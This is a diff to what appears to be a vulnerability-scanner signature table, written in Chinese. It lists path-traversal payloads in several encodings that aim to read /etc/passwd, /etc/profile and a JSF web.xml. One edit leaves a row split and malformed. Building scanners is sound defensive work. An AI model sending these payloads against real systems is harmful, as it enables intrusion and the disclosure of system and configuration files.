@@ -102,7 +102,9 @@ ueditor SSRF|存在目录文件 /ueditor/ueditor.config.js、/ueditor/php/getRem
 目录文件遍历泄漏|/../../../../../../../../../../../../../etc/profile   {tag="/etc/profile.d/*.sh"}|任意扫描方式|存在漏洞
 目录文件遍历泄漏|//././././././././././././././././././././././././../../../../../../../../etc/profile  {tag="/etc/profile.d/*.sh"} |任意扫描方式|存在漏洞
 目录文件遍历泄漏|/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile {status=200}  {tag="/etc/profile.d/*.sh"}|任意扫描方式|存在漏洞
-目录文件遍历泄漏|/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile {tag="/etc/profile.d/*.sh"} |任意扫描方式|存在漏洞
+目录文件遍历泄漏|/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile {tag="/etc/profile.d/*.sh"}
+目录文件遍历泄漏|/javax.faces.resource.../WEB-INF/web.xml.jsf    {status=200}    {type="xml"}    {tag="<?xml"} |任意扫描方式|存在漏洞
+|任意扫描方式|存在漏洞
 目录文件遍历泄漏|/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd  {tag="root:x:"}  |任意扫描方式|存在漏洞
 目录文件遍历泄漏|/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd   {tag="root:x:"} |任意扫描方式|存在漏洞
 目录文件遍历泄漏|/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd {tag="root:x:"} |任意扫描方式|存在漏洞
@@ -111,6 +113,5 @@ ueditor SSRF|存在目录文件 /ueditor/ueditor.config.js、/ueditor/php/getRem
 系统服务|/etc/passwd {tag="root:x:"} |任意扫描方式|存在漏洞
 系统服务|/etc/passwd {tag="root:x:"} |任意扫描方式|存在漏洞
 系统服务|/etc/passwd {tag="root:x:"} |任意扫描方式|存在漏洞
- | 
 
 
